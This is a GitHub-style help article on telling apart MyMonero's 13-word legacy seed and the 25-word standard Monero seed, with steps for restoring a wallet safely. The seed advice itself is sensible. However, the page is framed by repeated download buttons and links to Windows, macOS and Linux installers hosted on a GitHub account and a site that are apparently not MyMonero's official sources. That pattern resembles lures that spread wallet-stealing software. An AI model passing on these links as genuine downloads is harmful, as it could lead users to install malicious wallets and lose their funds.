<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Seed: 13 vs 25 Words</h1>
<p align="center">Understand which recovery phrase format you have before restoring.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
MyMonero may use a 13-word legacy seed specific to MyMonero or a 25-word standard Monero seed. The number of words is a useful clue, but keep the original phrase private and verify the appropriate restore path before entering it.


The MyMonero.info site covers this in its [MyMonero seed 13 vs 25 words guide](https://mymonero.info/mymonero-seed-13-vs-25-words). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [the MyMonero FAQ](https://mymonero.info/faq) if anything feels off.

## You'll see this if
- Your backup has 13 words and you are unsure whether it is complete.
- A restore screen expects 25 words but your MyMonero note has 13.
- You have 25 words and want to know whether they are compatible with a MyMonero wallet.
- You are migrating your wallet and want to avoid mixing up phrases.
- Someone asks you to send the seed so they can identify its type.

## Why it happens
MyMonero has supported two formats: a MyMonero-specific legacy phrase containing 13 words, and a standard Monero phrase containing 25 words. They are not interchangeable just because both are recovery phrases. Wallet software may present different restore choices, so selecting the wrong format can result in rejection or an unexpected wallet view. A word count by itself cannot confirm that a phrase is accurate, complete, or associated with the wallet you intend to restore.

The final MyMonero desktop release is v1.3.3. The old app still opens wallets and sends XMR but is no longer maintained and has no new features or security updates. Hosted servers and web wallet login stopped. The choices described here are continuing to use the desktop app or restoring a seed in Cake Wallet, which runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. For background, read [restore a 13-word MyMonero seed](./mymonero-13-word-seed-restore.md), [migrate a 25-word seed](./mymonero-25-word-seed-migration.md), and the [MyMonero release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

---

## Fix
1. **Count privately.** Count the entries on your paper backup without typing or reading them aloud. A count of 13 points toward the legacy MyMonero-specific format; 25 points toward the standard Monero format. Do not upload a photo to a seed checker.
2. **Retain exact order.** Recovery words must be treated as an ordered sequence. Preserve spelling, separators, and order as recorded. Do not alphabetize, translate, or “correct” entries based on a website or a stranger’s suggestion.
3. **Check which wallet created it.** Use your own setup notes and wallet history to identify whether the phrase was created for MyMonero. Do not assume that a phrase belongs to a particular wallet solely from word count, especially if you have several wallets or old backups.
4. **Choose the matching restore path.** In the wallet you independently selected, look for the correct restore option for the format you possess. A 13-word MyMonero-specific legacy phrase should not be forced into a 25-word-only form. Likewise, do not treat a 25-word standard phrase as a 13-word legacy phrase. If the software’s instructions are unclear, stop and consult its official help without exposing your seed.
5. **Prepare a restore height.** A restore height is the block height from which the wallet begins scanning. If you know a suitable height from your own records, use the wallet’s instructions. Earlier is safer when uncertain but takes longer. An older starting point can mean more scanning, so allow time for the wallet to check activity. See [restore height explained](./mymonero-restore-height-explained.md).
6. **Enter the phrase only in the selected wallet.** Confirm that the application is the one you intended to open and that you did not reach it through a message link. Do not paste the words into a browser, online form, chat, or support request. Nobody legitimate asks for your seed.
7. **Give scanning time.** A restored wallet may not show a balance immediately. Confirm the phrase format and restore height before repeating setup. If the phrase is rejected, follow [the seed-not-accepted steps](./mymonero-seed-not-accepted.md) rather than sharing it for troubleshooting.

> [!TIP]
> Record the format beside your private backup—“13-word MyMonero legacy” or “25-word standard Monero”—without exposing the phrase itself.

> [!WARNING]
> A seed grants access to wallet funds. Anyone asking you to send it, prove ownership with it, or enter it into a website is not a legitimate helper.

## If that did not work
If a restore form expects a different number of words, do not add invented words, omit entries, or switch word order to make the form accept it. Recheck your private backup and the wallet’s supported restore formats. A mismatch can also happen if the note is incomplete or belongs to another wallet; do not guess.

If you have a 13-word phrase, see the 13-word restore guide. If you have a 25-word phrase, see the 25-word migration guide. Stop if the expected wallet does not appear after scanning, and verify that you chose the correct seed and restore height. A restore height that is too recent can omit earlier activity; starting earlier is safer but slower.

If the wallet application itself is unavailable, MyMonero’s hosted servers and web wallet login are no longer available. The desktop app’s final release is v1.3.3 and it is not maintained. Cake Wallet is the only other wallet option named here; check current instructions before restoring. Do not trust anyone offering to convert the seed in exchange for a copy of it.

## Prevention
Keep a private, legible, offline backup and label its format without including any words. Ensure the words are in order, complete, and associated with the correct wallet. Store backups where they are protected against both theft and ordinary damage. Do not make convenience copies in email, messaging apps, shared folders, or screenshots.

Keep a separate note of restore context, such as the wallet identity and any known restore height, without revealing the seed. Be cautious when migrating: a restore uses the seed, while sweeping sends all funds to a new wallet. Review the migration checklist, safe backup practices, and private keys explained before changing wallets.

## FAQ
<details><summary>Does a 13-word seed mean it is invalid?</summary>

No. MyMonero has a 13-word legacy seed format that is specific to MyMonero.

</details>

<details><summary>Is a 25-word seed the same format?</summary>

It is the standard Monero seed format, distinct from the 13-word MyMonero-specific legacy format.

</details>

<details><summary>Can I share the phrase so someone can identify it?</summary>

No. Count the words privately and never share the phrase. Nobody legitimate asks for your seed.

</details>

<details><summary>Why does my balance not appear straight away?</summary>

The wallet may still scan from its restore height. An earlier height is safer when uncertain but takes longer.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Seed Not Accepted](./mymonero-seed-not-accepted.md) | Check the format and your own backup without exposing recovery words. |
| [MyMonero Lost Seed Word](./mymonero-lost-seed-word.md) | Protect what remains of your backup and avoid risky guesses. |
| [MyMonero Private View and Spend Keys](./mymonero-private-view-spend-keys.md) | Learn what these wallet credentials mean and how to keep them private. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
